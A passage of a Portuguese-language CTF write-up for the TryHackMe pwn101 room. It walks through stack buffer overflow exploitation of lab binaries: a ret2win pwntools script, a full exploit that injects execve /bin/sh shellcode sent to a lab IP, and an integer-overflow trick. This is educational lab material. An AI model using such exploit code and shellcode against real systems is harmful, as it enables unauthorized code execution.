<img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem4.png></p><p>Temos no início a declaração de uma variável com tamanho de 20 bytes. Reconhecemos a função scanf. Antes de sua chamada, é possível perceber que carregamos o endereço da variável s1 em rsi. Logo abaixo, existe a comparação do nosso input com a string &ldquo;yes&rdquo; com um salto para loc_401366 caso não sejam iguais. Nesse caso, pensei em análisar de forma dinâmica o que acontece quando eu &ldquo;quebro&rdquo; o programa. Vamos ver o que acontece durante o Segmentation Fault.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem5.png></p><p>Quando quebramos o programa, recebemos o seguinte aviso do IDA:</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem6.png></p><p>Ele reclama que no endereço 0x401377 tentamos acessar um endereço inválido. Mas, qual endereço? Vamos colocar um breakpoint no endereço da reclamação e visualizar a stack do processo.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem7.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem8.png></p><p>Claro. Aparentemente, estamos retornando para uma sequência de 41 que é a codificação ascii de &lsquo;A&rsquo; em hexadecimal. Hipotése:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Se pudermos controlar esse endereço, podemos controlar o fluxo do programa.
</span></span></code></pre></td></tr></table></div></div><p>Vamos tentar realizar uma prova de conceito manipulando diretamente a memória do processo a fim de manipular o endereço de retorno e ver o que acontece.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem9.png></p><p>Tentaremos colocar o endereço de admins_only</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem10.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem11.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem12.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem13.png></p><p>Conseguimos. Ou seja, basta colocarmos o endereço entre os A&rsquo;s enviados para redirecionar o programa para admins_only. Vamos ver como o programa se comporta adiante. Para isso, usarei a técnica de breakpoints em todas as instruções e olhos atentos.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem14.png></p><p>Talvez estejamos sobreescrevendo algo importante.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem15.png></p><p>Vemos que para chegar no endereço de retorno temos que preencher 40 A&rsquo;s. Façamos somente isso com a modificação do endereço e vamos ver o que acontece.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem16.png></p><p>O programa continua normalmente até que tenhamos outra segmentation fault na chamada de _system, nos redirecionando para uma instrução movaps dentro da função do_system.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem17.png></p><p>Procurando a definição da instrução na <a href=https://tizee.github.io/x86_ref_book_web/instruction/movaps.html#move-aligned-packed-single-precision-floating-point-values>internet</a>, vemos que precisamos garantir o alinhamento de 16 bytes dos operandos já que temos uma operação de memória.<br><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem18.png></p><p>Olhando para o valor do rsp, percebemos que não é o caso.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem19.png></p><p>Para contornar a situação, vamos manipular o tamanho da stack a fim de que tenhamos o alinhamento desejado. Uma técnica comum é a de usar um retorno intermediário. A ideia é saltar para uma instrução de retorno que saltará para a nossa função desejada. Nesse caso, vamos saltar de forma intermediária para o endereço 0x40158B. Depois que saltarmos, retn irá pegar o valor no topo da stack e saltar para esse endereço. Portanto, aí que colocaremos o nosso endereço da função admins_only.
<img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem20.png></p><p>Nosso shellcode deve ter a seguinte cara:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>40</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x40158B</span><span class=p>)</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x401554</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>Nosso script ficará assim:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>40</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x40158B</span><span class=p>)</span> <span class=o>+</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p64</span><span class=p>(</span><span class=mh>0x401554</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;ip&#34;</span><span class=p>,</span> <span class=mi>9003</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;3&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem21.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio3Imagem22.png></p><h2 id=pwn104---challenge-4>[pwn104 - Challenge 4]<a hidden class=anchor aria-hidden=true href=#pwn104---challenge-4>#</a></h2><p>No quarto desafio, nosso programa nos printa na tela uma mensagem com um endereço e aguarda um input. Como já é hábito, tentamos quebrar o programa. A nossa entrada gera um Segmentation Fault. Vamos partir para a análise dinâmica com o IDA.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem1.png></p><p>A estrutura do nosso programa é simples. Temos uma função principal com uma variável buf de tamanho 0x50. As coisas ficam interessantes nas chamadas para printf e read.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem2.png></p><p>A primeira carrega o endereço de buf e carrega a seguinte string para printar:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;I&#39;m waiting for you at %p\n&#34;
</span></span></code></pre></td></tr></table></div></div><p>Vamos comparar o endereço carregado em rsi na instrução <strong>mov rsi, rax</strong> com o que aparece no terminal.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem3.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem4.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem5.png></p><p>De fato, o endereço que aparece no terminal é o endereço do próprio buffer que está na função main. Posteriormente, a função read é chamada com o endereço de escrita no endereço de buf e com o tamanho de 200 bytes. É de esperar o Segmentation Fault. Estamos escrevendo até 200 bytes no endereço de buf. Mas, como exploramos essa vulnerabilidade? Dessa vez não existe nenhuma função de retorno interessante no binário. Lembre-se que não existe diferença fundamental entre dados e instruções. Bytes passam a cumprir papel de dados ou instruções a depender do contexto. A linguagem assembly nada mais é que uma codificação que permite que humanos interpretem mais facilmente a linguagem de máquina. Ainda, a linguagem de máquina nada mais é que uma codificação de bytes que permite que máquinas sejam capazes de interpretar bytes. Todo processador precisa &ldquo;saber&rdquo; aonde buscar os bytes a serem interpretados como instruções. Essa responsabilidade na arquitetura dos processadores x86-64 fica para o <strong>RIP</strong>, que é um registrador que armazena o endereço da próxima instrução. Se conseguirmos controlar o <strong>RIP</strong>, conseguimos escolher o que o processador vai tentar ler para interpretar como instruções. Mas, primeiro, vamos usar uma ferramenta que nos mostra as medidas de segurança que existem no binário.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem6.png></p><p>A ferramenta nos diz que a execução em pilha é permitida. Isso significa que podemos carregar bytes que correspondem a instruções na pilha e mandar o RIP apontar para lá. A forma que nós estamos acostumados a fazer é de garantir que o topo da pilha contenha nosso endereço desejado no momento em que o <strong>RIP</strong> aponta para a instrução retn.</p><p>O procedimento então fica da seguinte forma:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>preencher o buf com instruções + padding + endereço de retn  
</span></span></code></pre></td></tr></table></div></div><p>Colocando alguns A&rsquo;s e verificando o valor do rsp quando a instrução retn é executada, descobrimos até onde precisamos preencher. O fluxo retorna para libc_start_call_main.<br><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem7.png></p><p>Se contarmos quantas células temos, veremos que temos 12 * 8 bytes para serem preenchidos. Começamos em 0x00007FFFFFFFDC80 e terminamos em 0x00007FFFFFFFDCD8. Nosso payload deve ser da forma:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span>  <span class=n>shellcode</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>88</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span> <span class=o>+</span> <span class=n>endereço</span>
</span></span></code></pre></td></tr></table></div></div><p>O que queremos executar exatamente? Bom. Podemos executar instruções arbitrárias - contanto que caibam no buf. Porque não poppar um shell? Procurando na internet encontramos um shellcode x64 linux que realiza um execve com &ldquo;bin/sh&rdquo;. E como resolvemos o endereço? Bom. Nós recebemos o endereço na tela, basta capturamos com o pwntools.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>pwn</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#pwn.context.binary = binary = &#39;./pwn104-1644300377109.pwn104&#39;</span>
</span></span><span class=line><span class=cl><span class=n>pwn</span><span class=o>.</span><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>shellcode</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span>  <span class=n>shellcode</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=p>(</span><span class=mi>88</span><span class=o>-</span><span class=nb>len</span><span class=p>(</span><span class=n>shellcode</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#p = pwn.process(binary)</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>remote</span><span class=p>(</span><span class=s2>&#34;10.10.225.226&#34;</span><span class=p>,</span> <span class=mi>9004</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;I&#39;m waiting for you at &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>address</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>bufferAddress</span> <span class=o>=</span> <span class=n>pwn</span><span class=o>.</span><span class=n>p64</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>address</span><span class=p>,</span> <span class=mi>16</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>payload</span> <span class=o>+</span> <span class=n>bufferAddress</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>É importante notar a linha de conversão do endereço já que não recebemos os bytes puros no terminal. Recebemos a representação em ascii, como é possível ver a partir do offset 0x84 no pacote abaixo.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem8.png></p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio4Imagem9.png></p><h2 id=pwn105---challenge-5>[pwn105 - Challenge 5]<a hidden class=anchor aria-hidden=true href=#pwn105---challenge-5>#</a></h2><p>Ao executarmos o programa, nos deparamos com uma interface para a inserção de dois números. Temos um input para cada número. O programa printa na tela o resultado da soma dos dois. Tentando quebrar o programa de alguma forma não encontramos nada de interessante. Partimos logo, então, para a análise do binário no IDA.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio5Imagem1.png></p><p>O breakpoints marcam instruções do nosso interesse. Temos no início, dois scanf sem controle de tamanho de input. Percebemos também que os valores do primeiro e segundo input são carregados nas variáveis var14 e var10, respectivamente.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio5Imagem2.png></p><p>Esses valores são carregados nos registrados eax e edx. Em seguida, temos duas instruções do tipo</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>add</span> <span class=no>eax</span><span class=p>,</span> <span class=no>edx</span>
</span></span><span class=line><span class=cl><span class=nf>mov</span> <span class=p>[</span><span class=no>rbp</span><span class=err>+</span><span class=no>var_C</span><span class=p>],</span> <span class=no>eax</span>
</span></span></code></pre></td></tr></table></div></div><p>que adiciona os valores carregados no registrador eax e armazena na variável C.</p><p>Nosso objetivo está nos offset 0x130E e 0x1312.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-s data-lang=s><span class=line><span class=cl><span class=n>cmp</span> <span class=n>[rbp</span><span class=o>+</span><span class=n>var_C]</span><span class=p>,</span> <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=n>js</span> <span class=n>short</span> <span class=n>loc_134B</span>
</span></span></code></pre></td></tr></table></div></div><p>A primeira instrução verifica se o valor em var_C é negativo. A segunda pula para o endereço do procedimento do shell caso var_C seja negativa. O que precisamos então, é garantir que a variável C seja negativa. Se tentarmos simplesmente colocar valores negativos nos input teremos problemas com as seguintes instruções:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-s data-lang=s><span class=line><span class=cl><span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=n>[rbp</span><span class=o>+</span><span class=n>var_14]</span>
</span></span><span class=line><span class=cl><span class=n>test</span>    <span class=n>eax</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl><span class=n>js</span>      <span class=n>short</span> <span class=n>loc_1384</span>
</span></span><span class=line><span class=cl><span class=n>mov</span>     <span class=n>eax</span><span class=p>,</span> <span class=n>[rbp</span><span class=o>+</span><span class=n>var_10]</span>
</span></span><span class=line><span class=cl><span class=n>test</span>    <span class=n>eax</span><span class=p>,</span> <span class=n>eax</span>
</span></span><span class=line><span class=cl><span class=n>js</span>      <span class=n>short</span> <span class=n>loc_1384</span>
</span></span></code></pre></td></tr></table></div></div><p>Essas instruções verificam se uma das variáveis inseridas são negativas. Se forem, o programa salta para o procedimento loc_1384, que finaliza o programa.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio5Imagem3.png></p><p>Mas então, como fazer isso? Sabemos que nossas variáveis tem tamanho de 4 bytes.</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio5Imagem4.png></p><p>Além disso, lembre-se que nossos inteiros tem o valor máximo de 2147483647 e da forma de representação dos números com sinal em assembly. Pensando com a codificação two&rsquo;s complement, podemos abusar do overflow de inteiros (já que nesse caso não temos nenhuma checkagem). Com isso:</p><p><img alt="alt text" loading=lazy src=/images/crow-post-pwn/desafio5Imagem5.png></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/pwning/>Pwning</a></li><li><a href=http://localhost:1313/tags/reverse-engineering/>Reverse Engineering</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/blog/2024-08-11-writeup-lab01-rev-mbe/><span class=title>« Prev</span><br><span>Modern Binary Exploitation: Laboratório de Engenharia Reversa</span>
</a><a class=next href=http://localhost:1313/blog/2024-09-08-criptografia-de-reticulados/><span class=title>Next »</span><br><span>Explorando Criptografia de Reticulados</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on x" href="https://x.com/intent/tweet/?text=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f&amp;hashtags=pwning%2creverseengineering"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f&amp;title=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM&amp;summary=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM&amp;source=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on reddit" href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f&title=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Uma introdução prática a Exploração de Binários com Engenharia Reversa: writeUp da sala pwn101 THM on whatsapp" href="https://api.whatsapp.com/send?text=Uma%20introdu%c3%a7%c3%a3o%20pr%c3%a1tica%20a%20Explora%c3%a7%c3%a3o%20de%20Bin%c3%a1rios%20com%20Engenharia%20Reversa%3a%20writeUp%20da%20sala%20pwn101%20THM%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-pwn101-thm-writeup%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 